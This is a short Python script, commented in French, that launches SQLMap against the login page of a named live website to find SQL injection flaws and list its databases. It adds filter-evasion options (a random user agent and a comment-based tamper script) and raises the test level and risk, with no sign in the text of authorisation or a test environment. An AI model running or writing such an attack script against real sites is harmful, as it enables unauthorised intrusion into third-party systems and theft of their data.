import os
import subprocess
import datetime
import shutil

# URL cible pour l'analyse SQLMap
URL_CIBLE = "https://regisono.com/login.php?id=1"

# Générer un répertoire de sortie unique basé sur la date et l'heure
DATE_EXECUTION = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
OUTPUT_DIR = os.path.join(os.getcwd(), f"sqlmap_results_{DATE_EXECUTION}")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Vérification si SQLMap est installé
def is_sqlmap_installed():
    return shutil.which("sqlmap") is not None

if not is_sqlmap_installed():
    print("❌ ERREUR : SQLMap n'est pas installé. Exécutez `pip install sqlmap` avant de lancer ce script.")
    exit(1)

# Commande SQLMap ajustée
commande_sqlmap = [
    "sqlmap",  # Pas de chemin spécifique, on utilise la commande globale
    "-u", URL_CIBLE,
    "--batch",
    "--random-agent",
    "--level", "2",
    "--risk", "2",
    "--tamper=space2comment",
    "--output-dir", OUTPUT_DIR,
    "--flush-session",
    "--dbs",
    "--timeout=10",
    "--threads=5",
    "--smart",
    "--time-sec=5"
]

print(f"🚀 Lancement de l'analyse SQLMap sur {URL_CIBLE}...")

try:
    resultat = subprocess.run(commande_sqlmap, capture_output=True, text=True, check=True, timeout=600)
    print(resultat.stdout)

    # Sauvegarde du rapport SQLMap dans un fichier
    rapport_fichier = os.path.join(OUTPUT_DIR, "rapport_sqlmap.txt")
    with open(rapport_fichier, "w", encoding="utf-8") as f:
        f.write(resultat.stdout)

    print(f"✅ Rapport SQLMap enregistré dans {rapport_fichier}")

except subprocess.TimeoutExpired:
    print("⏳ SQLMap a dépassé le temps d’exécution autorisé (10 min). Annulation...")

except subprocess.CalledProcessError as e:
    print(f"❌ Erreur lors de l'exécution de SQLMap : {e}")
    print(f"🔍 Sortie d'erreur : {e.stderr}")

print("✅ Analyse terminée.")
